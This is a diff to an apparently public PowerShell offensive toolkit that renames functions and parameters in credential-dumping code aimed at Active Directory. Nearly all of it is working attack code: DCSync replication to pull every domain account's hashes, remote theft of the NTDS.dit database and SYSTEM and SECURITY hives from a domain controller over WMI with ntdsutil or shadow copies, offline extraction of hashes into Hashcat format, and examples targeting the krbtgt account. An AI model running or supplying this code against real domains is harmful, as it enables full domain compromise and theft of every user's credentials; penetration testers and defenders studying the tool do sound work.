@@ -13,7 +13,7 @@ function Invoke-DCSync {
     DSInternals powershell module must be installed first:
     PS C:\> Install-Module -Name DSInternals
 
-.PARAMETER DomainController
+.PARAMETER Server
     Specifies the target domain controller.
 
 .PARAMETER Credential
@@ -27,12 +27,12 @@ function Invoke-DCSync {
     PS C:\> Invoke-DCSync | Format-Custom -View HashcatNT
 
 .EXAMPLE
-    PS C:\> Invoke-DCSync -DomainController DC.ADATUM.CORP -Credential ADATUM\Administrator -SamAccountName krbtgt
+    PS C:\> Invoke-DCSync -Server DC.ADATUM.CORP -Credential ADATUM\Administrator -SamAccountName krbtgt
 #>
 	Param (
 		[ValidateNotNullOrEmpty()]
 		[String]
-		$DomainController = $env:LOGONSERVER,
+		$Server = $env:LOGONSERVER,
 
 		[ValidateNotNullOrEmpty()]
 		[System.Management.Automation.PSCredential]
@@ -46,14 +46,15 @@ function Invoke-DCSync {
 
 	# Check if DSInternals module is installed
 	If(-Not(Get-Module -Name DSInternals -ListAvailable)) {
-		Write-Warning "This command must be launched on a computer with Active Directory PowerShell module installed"
+		Write-Warning "This command must be launched on a computer with Active Directory PowerShell module installed."
+		Write-Warning "Please run command 'Install-Module -Name DSInternals' first"
 		Exit 1
 	} Else {
 		Import-Module DSInternals
 	}
 
 	# Retrieve base DN
-	$BaseURI = "LDAP://" + $DomainController
+	$BaseURI = "LDAP://" + $Server
 	$SearchString = $BaseURI + "/RootDSE"
 	If ($Credential.UserName) {
 		$DomainObject = New-Object System.DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
@@ -79,14 +80,22 @@ function Invoke-DCSync {
 		$Results.dispose()
 		$Searcher.dispose()
 		# Dump a specific domain account
-		Get-ADReplAccount -SamAccountName "$SamAccountName" -Server "$DomainController" -Domain $NetbiosName -Credential $Credential
+		If ($Credential.UserName) {
+			Get-ADReplAccount -SamAccountName "$SamAccountName" -Server "$Server" -Domain $NetbiosName -Credential $Credential
+		} Else {
+			Get-ADReplAccount -SamAccountName "$SamAccountName" -Server "$Server" -Domain $NetbiosName
+		}
 	} Else {
 		# Dump all domain accounts
-		Get-ADReplAccount -All -NamingContext "$BaseDN" -Server "$DomainController" -Credential $Credential
+		If ($Credential.UserName) {
+			Get-ADReplAccount -All -NamingContext "$BaseDN" -Server "$Server" -Credential $Credential
+		} Else {
+			Get-ADReplAccount -All -NamingContext "$BaseDN" -Server "$Server"
+		}
 	}
 }
 
-function Get-NtdsDatabase {
+function Get-ADDatabase {
 <#
 .SYNOPSIS
     Steal Active Directory database remotely.
@@ -94,10 +103,10 @@ function Get-NtdsDatabase {
     Author: Timothee MENOCHET (@TiM0)
 
 .DESCRIPTION
-    Get-NtdsDatabase makes a copy of the NTDS.dit file and related hives from a remote domain controller.
+    Get-ADDatabase makes a copy of the NTDS.dit file and related hives from a remote domain controller.
     The ntdsutil command is launch through WMI in case of Windows 2008 or later, otherwise WMI Volume Shadow Copy method is used.
 
-.PARAMETER DomainController
+.PARAMETER Server
     Specifies the target domain controller.
 
 .PARAMETER TargetDirectory
@@ -107,15 +116,15 @@ function Get-NtdsDatabase {
     Specifies the privileged account to use (typically Domain Admin).
 
 .EXAMPLE
-    PS C:\> Get-NtdsDatabase
+    PS C:\> Get-ADDatabase
 
 .EXAMPLE
-    PS C:\> Get-NtdsDatabase -DomainController DC.ADATUM.CORP -TargetDirectory C:\Windows\Temp -Credential ADATUM\Administrator
+    PS C:\> Get-ADDatabase -Server DC.ADATUM.CORP -TargetDirectory C:\Windows\Temp -Credential ADATUM\Administrator
 #>
 	Param (
 		[ValidateNotNullOrEmpty()]
 		[String]
-		$DomainController = $env:LOGONSERVER,
+		$Server = $env:LOGONSERVER,
 
 		[ValidateNotNullOrEmpty()]
 		[String]
@@ -128,25 +137,25 @@ function Get-NtdsDatabase {
 	)
 
 	# Identify the operating system version
-	Write-Host "[*] Identifying the operating system version of $DomainController"
+	Write-Host "[*] Identifying the operating system version of $Server"
 	Try {
-		$OS = Get-WmiObject Win32_OperatingSystem -ComputerName $DomainController -Credential $Credential
+		$OS = Get-WmiObject Win32_OperatingSystem -ComputerName $Server -Credential $Credential
 	} Catch {
 		Write-Warning $_
 		Exit 1
 	}
 
 	# Map a drive to the domain controller and create a temporary directory
-	New-PSDrive -Name "S" -Root "\\$DomainController\c$" -Credential $Credential -PSProvider "FileSystem" | Out-Null
+	New-PSDrive -Name "S" -Root "\\$Server\c$" -Credential $Credential -PSProvider "FileSystem" | Out-Null
 	New-Item -Path 'S:\Windows\Temp\dump' -ItemType directory | Out-Null
 
 	# If the operating system is Windows 2008 or later
 	If ($OS.Version[0] -ge 6) {
 		Write-Host "[*] Creating NTDS copy using ntdsutil"
-		$Process = Invoke-WmiMethod -Class Win32_Process -Name create -ArgumentList 'cmd.exe /c ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\dump" "quit" "quit"' -ComputerName $DomainController -Credential $Credential
+		$Process = Invoke-WmiMethod -Class Win32_Process -Name create -ArgumentList 'cmd.exe /c ntdsutil "ac in ntds" i "cr fu C:\Windows\Temp\dump" q q' -ComputerName $Server -Credential $Credential
 		Do {
 			Start-Sleep -m 250
-		} Until ((Get-WmiObject -Class Win32_process -Filter "ProcessId='$($Process.ProcessId)'" -ComputerName $DomainController -Credential $Credential | Where {$_.Name -eq "cmd.exe"}).ProcessID -eq $null)
+		} Until ((Get-WmiObject -Class Win32_process -Filter "ProcessId='$($Process.ProcessId)'" -ComputerName $Server -Credential $Credential | Where {$_.Name -eq "cmd.exe"}).ProcessID -eq $null)
 
 		# Copy the ntds.dit file and registry hives locally
 		Write-Host "[*] Copying the NTDS file and registry hives into $(Resolve-Path $TargetDirectory)"
@@ -161,24 +170,24 @@ function Get-NtdsDatabase {
 		$Hive = [uint32]2147483650
 		$Key = "SYSTEM\\CurrentControlSet\\Services\\NTDS\Parameters"
 		$Value = "DSA Database File"
-		$DitPath = (Invoke-WmiMethod -Class StdRegProv -Name GetStringValue -ArgumentList $Hive, $Key, $Value -ComputerName $DomainController -Credential $Credential).sValue
+		$DitPath = (Invoke-WmiMethod -Class StdRegProv -Name GetStringValue -ArgumentList $Hive, $Key, $Value -ComputerName $Server -Credential $Credential).sValue
 		$DitDrive = $DitPath.Split("\")[0]
 		$DitRelativePath = $DitPath.Split("\")[1..($DitPath.Split("\").Length - 2)] -Join "\"
 
 		# Create a shadow copy of the corresponding drive
 		Write-Host "[*] Creating a shadow copy"
-		$Process = Invoke-WmiMethod -Class Win32_ShadowCopy -Name Create -ArgumentList 'ClientAccessible',"$DitDrive\" -ComputerName $DomainController -Credential $Credential
-		$ShadowCopy = Get-WmiObject -Class Win32_ShadowCopy -Property DeviceObject -Filter "ID = '$($Process.ShadowID)'" -ComputerName $DomainController -Credential $Credential
+		$Process = Invoke-WmiMethod -Class Win32_ShadowCopy -Name Create -ArgumentList 'ClientAccessible',"$DitDrive\" -ComputerName $Server -Credential $Credential
+		$ShadowCopy = Get-WmiObject -Class Win32_ShadowCopy -Property DeviceObject -Filter "ID = '$($Process.ShadowID)'" -ComputerName $Server -Credential $Credential
 		$DeviceObject = $ShadowCopy.DeviceObject.ToString()
 
 		# Copy the ntds.dit file and SYSTEM hive from the shadow copy
-		$Process = Invoke-WmiMethod -Class Win32_Process -Name create -ArgumentList "cmd.exe /c for %I in ($DeviceObject\$DitRelativePath\ntds.dit $DeviceObject\$DitRelativePath\edb.log $DeviceObject\Windows\System32\config\SYSTEM $DeviceObject\Windows\System32\config\SECURITY) do copy %I C:\Windows\Temp\dump" -ComputerName $DomainController -Credential $Credential
+		$Process = Invoke-WmiMethod -Class Win32_Process -Name create -ArgumentList "cmd.exe /c for %I in ($DeviceObject\$DitRelativePath\ntds.dit $DeviceObject\$DitRelativePath\edb.log $DeviceObject\Windows\System32\config\SYSTEM $DeviceObject\Windows\System32\config\SECURITY) do copy %I C:\Windows\Temp\dump" -ComputerName $Server -Credential $Credential
 		Do {
 			Start-Sleep -m 250
-		} Until ((Get-WmiObject -Class Win32_process -Filter "ProcessId='$($Process.ProcessId)'" -ComputerName $DomainController -Credential $Credential | Where {$_.Name -eq "cmd.exe"}).ProcessID -eq $null)
+		} Until ((Get-WmiObject -Class Win32_process -Filter "ProcessId='$($Process.ProcessId)'" -ComputerName $Server -Credential $Credential | Where {$_.Name -eq "cmd.exe"}).ProcessID -eq $null)
 
 		# Delete the shadow copy
-		(Get-WmiObject -Namespace root\cimv2 -Class Win32_ShadowCopy -ComputerName $DomainController -Credential $Credential | Where-Object {$_.DeviceObject -eq $DeviceObject}).Delete()
+		(Get-WmiObject -Namespace root\cimv2 -Class Win32_ShadowCopy -ComputerName $Server -Credential $Credential | Where-Object {$_.DeviceObject -eq $DeviceObject}).Delete()
 
 		# Copy the ntds.dit file and registry hives locally
 		Write-Host "[*] Copying the NTDS file and registry hives into $(Resolve-Path $TargetDirectory)"
@@ -194,15 +203,15 @@ function Get-NtdsDatabase {
 	Remove-PSDrive S
 }
 
-function Dump-NtdsDatabase {
+function Dump-ADDatabase {
 <#
 .SYNOPSIS
-    Dump domain accounts from an Active Directory database.
+    Dump domain accounts from an offline Active Directory database.
 
     Author: Timothee MENOCHET (@TiM0)
 
 .DESCRIPTION
-    Dump-NtdsDatabase extracts domain accounts from NTDS database and SYSTEM hive files, including password hashes.
+    Dump-ADDatabase extracts domain accounts from NTDS database and SYSTEM hive files, including password hashes.
     By default, all account objects are returned.
 
 .NOTES
@@ -220,10 +229,10 @@ function Dump-NtdsDatabase {
     By default, all domain accounts will be retrieved.
 
 .EXAMPLE
-    PS C:\> Dump-NtdsDatabase | Format-Custom -View HashcatNT
+    PS C:\> Dump-ADDatabase | Format-Custom -View HashcatNT
 
 .EXAMPLE
-    PS C:\> Dump-NtdsDatabase -DatabasePath C:\Windows\Temp\ntds.dit -SystemHiveFilePath C:\Windows\Temp\SYSTEM -SamAccountName krbtgt
+    PS C:\> Dump-ADDatabase -DatabasePath C:\Windows\Temp\ntds.dit -SystemHiveFilePath C:\Windows\Temp\SYSTEM -SamAccountName krbtgt
 #>
 	Param (
 		[ValidateNotNullOrEmpty()]
@@ -241,7 +250,8 @@ function Dump-NtdsDatabase {
 
 	# Check if DSInternals module is installed
 	If(-Not(Get-Module -Name DSInternals -ListAvailable)) {
-		Write-Warning "This command must be launched on a computer with Active Directory PowerShell module installed"
+		Write-Warning "This command must be launched on a computer with Active Directory PowerShell module installed."
+		Write-Warning "Please run command 'Install-Module -Name DSInternals' first"
 		Exit 1
 	} Else {
 		Import-Module DSInternals
@@ -265,7 +275,7 @@ function Dump-NtdsDatabase {
 	}
 }
 
-function Mount-NtdsDatabase {
+function Mount-ADDatabase {
 <#
 .SYNOPSIS
     Mount an Active Directory database locally.
@@ -273,7 +283,7 @@ function Mount-NtdsDatabase {
     Author: Timothee MENOCHET (@TiM0)
 
 .DESCRIPTION
-    Mount-NtdsDatabase exposes a NTDS database file as a Lightweight Directory Access Protocol (LDAP) server using DSAMain.exe.
+    Mount-ADDatabase exposes a NTDS database file as a Lightweight Directory Access Protocol (LDAP) server using DSAMain.exe.
     Database can then be queried using Invoke-LdapSearch or PowerView.
 
 .NOTES
@@ -294,10 +304,10 @@ function Mount-NtdsDatabase {
     Specifies the listening port for the LDAP service.
 
 .EXAMPLE
-    PS C:\> Mount-NtdsDatabase
+    PS C:\> Mount-ADDatabase
 
 .EXAMPLE
-    PS C:\> Mount-NtdsDatabase -DatabasePath C:\Windows\Temp\ntds.dit -AllowUpgrade 1 -LdapPort 1389
+    PS C:\> Mount-ADDatabase -DatabasePath C:\Windows\Temp\ntds.dit -AllowUpgrade 1 -LdapPort 1389
 #>
 	Param (
 		[ValidateNotNullOrEmpty()]
@@ -337,13 +347,14 @@ function Mount-NtdsDatabase {
 		Write-Warning "An error occured, retry with another port for LDAP server. If the error persist, please try the option 'AllowUpgrade' after backing up the database file"
 	} ElseIf (-Not((Test-NetConnection -ComputerName localhost -Port $LdapPort -ErrorAction SilentlyContinue).TcpTestSucceeded)) {
 		Write-Warning "An error occured, retry with option 'AllowUpgrade' after backing up the database file"
-		Umount-NtdsDatabase
+		Umount-ADDatabase
 	} Else {
 		Write-Host "[*] LDAP server listening on port $LdapPort"
+		Write-Host "[!] Run command 'Umount-ADDatabase' to stop"
 	}
 }
 
-function Umount-NtdsDatabase {
+function Umount-ADDatabase {
 	Get-Process dsamain -ErrorAction SilentlyContinue | Stop-Process
 }
 
@@ -357,7 +368,7 @@ function Invoke-LdapSearch {
 .DESCRIPTION
     Invoke-LdapSearch builds a directory searcher object using ADSI and searches for objects matching a custom LDAP filter.
     By default, all account objects for the target directory are returned.
-    Uses LDAP protocol for compatibility with NTDS databases exposed through Mount-NtdsDatabase.
+    Uses LDAP protocol for compatibility with NTDS databases exposed through Mount-ADDatabase.
 
 .PARAMETER Server
     Specifies the target directory server.
